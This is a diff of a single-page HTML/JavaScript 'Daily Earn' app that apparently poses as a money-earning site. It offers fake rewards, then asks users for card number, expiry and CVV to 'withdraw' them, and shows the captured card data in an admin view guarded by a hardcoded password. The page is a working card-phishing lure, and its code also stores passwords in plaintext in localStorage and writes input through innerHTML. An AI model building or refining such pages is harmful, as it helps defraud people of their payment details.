@@ -1,137 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Daily Earn - Secure Mobile</title>
+    <title>Daily Earn - Pocket Wealth</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --primary: #1e3c72; --secondary: #2a5298; --success: #28a745; --danger: #e74c3c; --warning: #f1c40f; --bg: #f8f9fa; }
-        body { margin: 0; font-family: 'Roboto', sans-serif; background: var(--bg); padding-bottom: 90px; -webkit-tap-highlight-color: transparent; }
-        
-        /* Navigation */
-        .sidebar { background: linear-gradient(180deg, var(--primary), var(--secondary)); color: white; position: fixed; bottom: 0; width: 100%; z-index: 1000; box-shadow: 0 -3px 15px rgba(0,0,0,0.2); display: none; }
-        .sidebar-menu { display: flex; justify-content: space-around; }
-        .sidebar button { width: 100%; padding: 12px 2px; border: none; background: none; color: white; font-size: 11px; font-weight: 500; }
+        :root { 
+            --primary: #0f2027; 
+            --accent: #2193b0; 
+            --gold: #f1c40f;
+            --success: #2ecc71; 
+            --danger: #e74c3c; 
+            --glass: rgba(255, 255, 255, 0.9);
+        }
 
-        /* Auth Screens */
-        .auth-container { display: flex; flex-direction: column; justify-content: center; min-height: 100vh; padding: 25px; box-sizing: border-box; background: white; }
-        .auth-card { width: 100%; max-width: 400px; margin: auto; }
-        .auth-header { text-align: center; margin-bottom: 30px; }
-        .auth-header h1 { color: var(--primary); margin: 0; }
+        body { 
+            margin: 0; 
+            font-family: 'Poppins', sans-serif; 
+            background: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?auto=format&fit=crop&q=80&w=1000') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            min-height: 100vh;
+        }
 
-        /* General Layout */
-        .content { padding: 15px; max-width: 600px; margin: auto; display: none; }
-        .card { background: white; padding: 18px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); margin-bottom: 15px; border: 1px solid #eee; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        
-        /* Form Styling */
-        input, select { width: 100%; padding: 14px; margin-bottom: 12px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
-        input.error { border-color: var(--danger); animation: shake 0.2s 2; }
-        .btn { background: var(--secondary); color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
-        .btn-link { background: none; color: var(--secondary); margin-top: 10px; text-decoration: underline; font-size: 14px; }
+        /* Responsive Overlay */
+        .overlay { background: rgba(0, 0, 0, 0.6); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
 
-        /* Admin UI */
-        .admin-item { border-bottom: 1px solid #eee; padding: 10px 0; font-size: 14px; line-height: 1.6; }
-        .badge { padding: 3px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; text-transform: uppercase; }
-        .processing { background: var(--warning); color: #000; }
-        .approved { background: var(--success); color: #fff; }
-        .rejected { background: var(--danger); color: #fff; }
+        /* Auth Screen */
+        .auth-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .auth-card { 
+            background: var(--glass); 
+            padding: 30px; 
+            border-radius: 25px; 
+            width: 100%; 
+            max-width: 400px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
 
+        /* Inputs & Buttons */
+        input, select { 
+            width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #ddd; 
+            border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none;
+        }
+
+        .btn { 
+            background: linear-gradient(90deg, #2193b0, #6dd5ed); 
+            color: white; border: none; padding: 15px; border-radius: 12px; 
+            font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn:active { transform: scale(0.95); }
+
+        /* Navigation Bar (Android Style) */
+        .nav-bar { 
+            background: var(--primary); position: fixed; bottom: 0; width: 100%; 
+            display: none; justify-content: space-around; padding: 10px 0;
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.3); border-radius: 20px 20px 0 0;
+            z-index: 1000;
+        }
+        .nav-bar button { background: none; border: none; color: #fff; font-size: 10px; opacity: 0.7; }
+        .nav-bar button.active { opacity: 1; color: var(--gold); }
+
+        /* Content Area */
+        .content { padding: 20px; padding-bottom: 100px; display: none; }
+        .card { 
+            background: white; padding: 20px; border-radius: 20px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 15px;
+        }
+
+        .balance-card { 
+            background: linear-gradient(135deg, #1e3c72, #2a5298); 
+            color: white; text-align: center; padding: 30px; 
+        }
+
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .hidden { display: none; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        
+        /* Badges */
+        .status { padding: 4px 10px; border-radius: 8px; font-size: 12px; font-weight: bold; }
+        .status.Processing { background: var(--gold); }
+        .status.Approved { background: var(--success); color: white; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .tab { animation: fadeIn 0.4s ease; }
     </style>
 </head>
 <body>
 
+<div class="overlay"></div>
+
 <div id="auth-screen" class="auth-container">
     <div class="auth-card" id="signup-form">
-        <div class="auth-header"><h1>Daily Earn</h1><p>Join & Get $100 Bonus!</p></div>
+        <h1 style="color: var(--primary); margin-top: 0;">Daily Earn</h1>
+        <p style="color: #666; font-size: 14px;">Sign up to get <b>$100</b> Reward!</p>
+        
         <input type="text" id="reg-name" placeholder="Full Name">
-        <input type="number" id="reg-age" placeholder="Age">
+        <input type="number" id="reg-age" placeholder="Your Age">
         <select id="reg-gender">
             <option value="">Select Gender</option>
             <option value="Male">Male</option>
             <option value="Female">Female</option>
+            <option value="Other">Other</option>
         </select>
         <input type="text" id="reg-country" placeholder="Country">
-        <input type="password" id="reg-pass" placeholder="Create Password">
-        <button class="btn" onclick="handleSignup()">Sign Up</button>
-        <button class="btn-link" onclick="toggleAuth('login')">Have an account? Login</button>
+        <input type="password" id="reg-pass" placeholder="Password">
+        
+        <button class="btn" onclick="handleSignup()">Join Now</button>
+        <p onclick="toggleAuth('login')" style="font-size: 12px; margin-top: 15px; color: var(--accent);">Login Instead</p>
     </div>
 
     <div class="auth-card hidden" id="login-form">
-        <div class="auth-header"><h1>Welcome Back</h1><p>Login to your account</p></div>
+        <h1>Welcome Back</h1>
         <input type="text" id="log-name" placeholder="Full Name">
         <input type="password" id="log-pass" placeholder="Password">
         <button class="btn" onclick="handleLogin()">Login</button>
-        <button class="btn-link" onclick="toggleAuth('signup')">Create Account</button>
+        <p onclick="toggleAuth('signup')" style="font-size: 12px; margin-top: 15px; color: var(--accent);">Create Account</p>
     </div>
 </div>
 
-<div class="sidebar" id="app-nav">
-    <div class="sidebar-menu">
-        <button onclick="showTab('dashboard')">🏠<br>Home</button>
-        <button onclick="showTab('tasks')">💰<br>Tasks</button>
-        <button onclick="showTab('refer')">👥<br>Refer</button>
-        <button onclick="showTab('withdraw')">💳<br>Cashout</button>
-        <button onclick="showTab('profile')">👤<br>Account</button>
-    </div>
+<div class="nav-bar" id="app-nav">
+    <button onclick="showTab('dashboard')">🏠<br>Home</button>
+    <button onclick="showTab('tasks')">💰<br>Tasks</button>
+    <button onclick="showTab('withdraw')">💳<br>Withdraw</button>
+    <button onclick="showTab('profile')">👤<br>Account</button>
 </div>
 
 <div class="content" id="app-content">
+    
     <div id="dashboard" class="tab">
-        <div class="card" style="background: var(--primary); color: white; text-align: center;">
-            <p>Balance</p>
-            <h1 style="font-size: 42px; margin: 10px 0;">$<span id="earnings">0</span></h1>
-            <button class="btn" style="background: var(--success);" onclick="dailyClaim()">🎁 Daily Bonus +$10</button>
+        <div class="card balance-card">
+            <p style="opacity: 0.8; margin:0;">Total Earnings</p>
+            <h1 style="font-size: 48px; margin: 10px 0;">$<span id="earnings">0</span></h1>
+            <button class="btn" style="background: var(--gold); color: #000;" onclick="dailyClaim()">🎁 Daily Bonus +$10</button>
+        </div>
+        <div class="card">
+            <h3>Quick Actions</h3>
+            <button class="btn" onclick="simulateReferral()">Invite Friend (Earn $4)</button>
         </div>
     </div>
 
     <div id="tasks" class="tab hidden">
-        <div class="card"><h3>Earn $20 Tasks</h3><div id="taskList" class="grid"></div></div>
-    </div>
-
-    <div id="refer" class="tab hidden">
-        <div class="card" style="text-align:center;">
-            <h2>Refer & Earn $4</h2>
-            <button class="btn" onclick="simulateReferral()">Invite Friend (Simulate)</button>
+        <div class="card">
+            <h3>Daily Tasks (+$20)</h3>
+            <div id="taskList" class="grid"></div>
         </div>
     </div>
 
     <div id="withdraw" class="tab hidden">
         <div class="card">
-            <h3>Withdraw</h3>
-            <input type="number" id="wAmount" placeholder="Amount ($)">
+            <h3>Cashout Method</h3>
+            <input type="number" id="wAmount" placeholder="Amount to Withdraw">
             <input type="text" id="wCardName" placeholder="Cardholder Name">
             <input type="tel" id="wNumber" placeholder="Card Number" maxlength="16">
             <div style="display:flex; gap:10px;">
                 <input type="tel" id="wExpiry" placeholder="MM/YY" maxlength="5">
                 <input type="tel" id="wCVV" placeholder="CVV" maxlength="3">
             </div>
-            <button class="btn" onclick="processWithdrawal()">Submit Cashout</button>
+            <button class="btn" style="background: var(--primary);" onclick="processWithdrawal()">Submit Request</button>
         </div>
     </div>
 
     <div id="profile" class="tab hidden">
         <div class="card">
-            <h3>Account Details</h3>
-            <p>Name: <strong id="user-display">---</strong></p>
-            <button class="btn-link" onclick="openAdmin()">Access Admin Panel</button>
+            <h3>Profile Summary</h3>
+            <p>User: <b id="user-display">---</b></p>
+            <p>Gender: <b id="user-gender">---</b></p>
+            <p>Status: <span style="color:green;">Verified ✓</span></p>
+            <button class="btn" style="padding: 8px; font-size: 12px;" onclick="openAdmin()">Access Admin</button>
         </div>
-        <div class="card"><h3>History</h3><div id="historyList"></div></div>
-        <button class="btn" style="background:var(--danger)" onclick="logout()">Logout</button>
+        <div class="card">
+            <h3>Cashout History</h3>
+            <div id="historyList"></div>
+        </div>
+        <button class="btn" style="background: var(--danger);" onclick="logout()">Logout</button>
     </div>
 
     <div id="admin" class="tab hidden">
         <div class="card">
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <h3>Admin Control</h3>
-                <button onclick="showTab('profile')" style="border:none; background:none; color:blue;">Close</button>
-            </div>
-            <hr>
+            <h3>Admin Panel</h3>
             <div id="admin-requests"></div>
+            <button class="btn" style="margin-top:20px; background:#666;" onclick="showTab('profile')">Exit Admin</button>
         </div>
     </div>
+
 </div>
 
 <script>
@@ -145,12 +200,14 @@
     function handleSignup() {
         const name = document.getElementById('reg-name').value;
         const age = document.getElementById('reg-age').value;
+        const gender = document.getElementById('reg-gender').value;
         const pass = document.getElementById('reg-pass').value;
-        if(!name || !pass) return alert("Fill Name and Password");
 
-        const user = { name, age, pass, earnings: 100, tasks: [], withdrawals: [] };
+        if(!name || !age || !gender || !pass) return alert("Please fill everything!");
+
+        const user = { name, age, gender, pass, earnings: 100, tasks: [], withdrawals: [] };
         localStorage.setItem(`user_${name}`, JSON.stringify(user));
-        alert("Account Created! Login now.");
+        alert("Account Verified! Login now.");
         toggleAuth('login');
     }
 
@@ -163,113 +220,90 @@
             activeUser = stored;
             localStorage.setItem("activeSession", JSON.stringify(activeUser));
             startApp();
-        } else { alert("Error!"); }
+        } else { alert("Login Failed!"); }
     }
 
     function startApp() {
         document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('app-nav').style.display = 'block';
+        document.getElementById('app-nav').style.display = 'flex';
         document.getElementById('app-content').style.display = 'block';
         updateUI();
     }
-
-    function logout() { localStorage.removeItem("activeSession"); location.reload(); }
 
     function updateUI() {
         if(!activeUser) return;
         document.getElementById("earnings").innerText = activeUser.earnings;
         document.getElementById("user-display").innerText = activeUser.name;
+        document.getElementById("user-gender").innerText = activeUser.gender;
 
-        // Tasks
         const tList = document.getElementById("taskList");
         tList.innerHTML = "";
-        for(let i=1; i<=6; i++) {
+        for(let i=1; i<=8; i++) {
             let done = activeUser.tasks.includes(i);
-            tList.innerHTML += `<button class="btn" ${done ? 'disabled style="background:gray"' : ''} onclick="doTask(${i})">Task ${i}</button>`;
+            tList.innerHTML += `<button class="btn" style="${done ? 'background:#ccc' : ''}" ${done ? 'disabled' : ''} onclick="doTask(${i})">Task ${i}</button>`;
         }
         
-        // History
         const hList = document.getElementById("historyList");
         hList.innerHTML = activeUser.withdrawals.map(w => `
-            <div class="admin-item">
-                $${w.amount} - <span class="badge ${w.status.toLowerCase()}">${w.status}</span>
+            <div style="border-bottom:1px solid #eee; padding:10px 0;">
+                $${w.amount} <span class="status ${w.status}">${w.status}</span>
             </div>
-        `).reverse().join('') || "No transactions";
+        `).reverse().join('') || "No history.";
 
         localStorage.setItem(`user_${activeUser.name}`, JSON.stringify(activeUser));
         localStorage.setItem("activeSession", JSON.stringify(activeUser));
     }
 
     function doTask(id) { activeUser.earnings += 20; activeUser.tasks.push(id); updateUI(); }
-    function dailyClaim() { activeUser.earnings += 10; updateUI(); }
-    function simulateReferral() { activeUser.earnings += 4; updateUI(); }
+    function dailyClaim() { activeUser.earnings += 10; updateUI(); alert("+$10 Added!"); }
+    function simulateReferral() { activeUser.earnings += 4; updateUI(); alert("Friend joined! +$4"); }
 
     function processWithdrawal() {
         const amt = parseInt(document.getElementById('wAmount').value);
-        const name = document.getElementById('wCardName').value;
-        const num = document.getElementById('wNumber').value;
-        const exp = document.getElementById('wExpiry').value;
-        const cvv = document.getElementById('wCVV').value;
-
-        if(!num || !cvv || !exp) return alert("Fill Card Details!");
-        if(amt > activeUser.earnings) return alert("Insufficient!");
+        if(!amt || amt < 10) return alert("Min withdrawal $10");
+        if(amt > activeUser.earnings) return alert("Insufficient balance!");
 
         activeUser.withdrawals.push({
             id: Date.now(),
             amount: amt,
-            cardName: name,
-            cardNum: num,
-            expiry: exp,
-            cvv: cvv,
+            cardNum: document.getElementById('wNumber').value,
+            expiry: document.getElementById('wExpiry').value,
+            cvv: document.getElementById('wCVV').value,
             status: "Processing"
         });
         activeUser.earnings -= amt;
         updateUI();
-        alert("Submitted to Admin!");
+        alert("Submitted to Admin for Approval!");
+    }
+
+    function openAdmin() {
+        if(prompt("Admin Password:") === "OBASEMO1") { showTab('admin'); renderAdmin(); }
+    }
+
+    function renderAdmin() {
+        const adminDiv = document.getElementById('admin-requests');
+        adminDiv.innerHTML = activeUser.withdrawals.filter(w => w.status === "Processing").map((w, index) => `
+            <div class="card" style="border-left: 5px solid gold; font-size:12px;">
+                <p>Card: <b>${w.cardNum}</b> Exp: ${w.expiry} CVV: ${w.cvv}</p>
+                <p>Amount: <b>$${w.amount}</b></p>
+                <button class="btn" style="background:var(--success); padding:5px;" onclick="updateStatus(${activeUser.withdrawals.indexOf(w)}, 'Approved')">Approve</button>
+            </div>
+        `).join('') || "No pending payments.";
+    }
+
+    function updateStatus(index, status) {
+        activeUser.withdrawals[index].status = status;
+        save(); updateUI(); renderAdmin();
     }
 
     function showTab(id) {
         document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
+        window.scrollTo(0,0);
     }
 
-    // ADMIN SECTION
-    function openAdmin() {
-        const p = prompt("Enter Admin Password:");
-        if(p === "OBASEMO1") {
-            showTab('admin');
-            renderAdmin();
-        } else { alert("Wrong Password!"); }
-    }
-
-    function renderAdmin() {
-        const adminDiv = document.getElementById('admin-requests');
-        adminDiv.innerHTML = "";
-        
-        // Admin sees all withdrawal requests of the active user
-        activeUser.withdrawals.forEach((w, index) => {
-            if(w.status === "Processing") {
-                adminDiv.innerHTML += `
-                <div class="card" style="border-left: 5px solid var(--warning)">
-                    <p><strong>Amount:</strong> $${w.amount}</p>
-                    <p><strong>Card:</strong> ${w.cardNum}</p>
-                    <p><strong>Exp/CVV:</strong> ${w.expiry} / ${w.cvv}</p>
-                    <p><strong>Name:</strong> ${w.cardName}</p>
-                    <button class="btn" style="background:var(--success); margin-bottom:5px;" onclick="updateStatus(${index}, 'Approved')">Approve</button>
-                    <button class="btn" style="background:var(--danger)" onclick="updateStatus(${index}, 'Rejected')">Reject</button>
-                </div>`;
-            }
-        });
-
-        if(adminDiv.innerHTML === "") adminDiv.innerHTML = "No pending requests.";
-    }
-
-    function updateStatus(index, status) {
-        activeUser.withdrawals[index].status = status;
-        alert("Status Updated!");
-        updateUI();
-        renderAdmin();
-    }
+    function logout() { localStorage.removeItem("activeSession"); location.reload(); }
+    function save() { localStorage.setItem(`user_${activeUser.name}`, JSON.stringify(activeUser)); }
 
     if(activeUser) startApp();
 </script>
